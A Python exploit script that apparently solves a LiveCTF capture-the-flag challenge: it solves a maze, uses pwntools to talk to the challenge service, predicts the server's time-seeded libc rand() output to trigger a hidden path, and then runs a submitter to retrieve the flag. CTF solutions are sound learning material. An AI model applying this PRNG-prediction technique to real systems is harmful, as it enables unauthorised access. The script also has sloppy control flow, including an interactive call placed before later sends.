#!/usr/bin/env python3

import operator
import sys


class Maze(object):
    """Represents a two-dimensional maze, where each cell can hold a
       single marker."""

    def __init__(self):
        self.data = []

    def read_file(self, path):
        """Read a maze text file and split out each character. Return
           a 2-dimensional list where the first dimension is rows and
           the second is columns."""
        maze = []
        for line in path:
            maze.append(list(line))
        self.data = maze

    def write_file(self, path):
        """Write the specified 2-dimensional maze to the specified
           file, writing one line per row and with columns
           side-by-side."""
        with open(path, 'w') as f:
            for r, line in enumerate(self.data):
                f.write('%s\n' % ''.join(line))

    def find(self, symbol):
        """Find the first instance of the specified symbol in the
           maze, and return the row-index and column-index of the
           matching cell. Return None if no such cell is found."""
        for r, line in enumerate(self.data):
            try:
                return r, line.index(symbol)
            except ValueError:
                pass

    def get(self, where):
        """Return the symbol stored in the specified cell."""
        r, c = where
        return self.data[r][c]

    def set(self, where, symbol):
        """Store the specified symbol in the specified cell."""
        r, c = where
        self.data[r][c] = symbol

    def __str__(self):
        return '\n'.join(''.join(r) for r in self.data)


def solve(maze, where=None, direction=None):
    """Finds a path through the specified maze beginning at where (or
       a cell marked 'S' if where is not provided), and a cell marked
       'E'. At each cell the four directions are tried in the order
       RIGHT, DOWN, LEFT, UP. When a cell is left, a marker symbol
       (one of '>', 'v', '<', '^') is written indicating the new
       direction, and if backtracking is necessary, a symbol ('.') is
       also written. The return value is None if no solution was
       found, and a (row_index, column_index) tuple when a solution
       is found."""
    start_symbol = '@'
    end_symbol = '*'
    vacant_symbol = '.'
    backtrack_symbol = '.'
    directions = (0, 1), (1, 0), (0, -1), (-1, 0)
    direction_marks = 'e', 's', 'w', 'n'

    where = where or maze.find(start_symbol)
    if not where:
        # no start cell found
        return []
    if maze.get(where) == end_symbol:
        # standing on the end cell
        return [end_symbol]
    if maze.get(where) not in (vacant_symbol, start_symbol):
        # somebody has been here
        return []

    for direction in directions:
        next_cell = list(map(operator.add, where, direction))

        # spray-painting direction
        marker = direction_marks[directions.index(direction)]
        if maze.get(where) != start_symbol:
            maze.set(where, marker)

        sub_solve = solve(maze, next_cell, direction)
        if sub_solve:
            # found solution in this direction
            is_first_step = maze.get(where) == start_symbol
            return ([] if is_first_step else []) +\
                   ([marker] if is_first_step else [marker]) +\
                   sub_solve
    # no directions worked from here - have to backtrack
    maze.set(where, backtrack_symbol)

import ctypes
import time
libc = ctypes.CDLL('libc.so.6')


from pwn import *
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
r = remote(HOST, int(PORT))
libc.srand(int(time.time()))

maze = Maze()
r.sendline('a')
r.recvuntil('bove the maze.')
r.readline()
print('?')

ma = []
for i in range(30):
    ma.append(r.readline().decode().strip())
print('\n'.join(ma))
maze.read_file(ma)

solution = solve(maze)[:-1]
for s in solution[:-1]:
    r.sendline(s)
print(solution)

for i in range(591):
    libc.rand()

for i in range(len(solution)):
    libc.rand()

counter = 0
while libc.rand() % 1213 != 1212:
    counter += 1

print(counter)
r.interactive()

for i in range(counter+1):
    r.sendline('?')

r.sendline(solution[-1])

r.sendline(b'./submitter')
flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
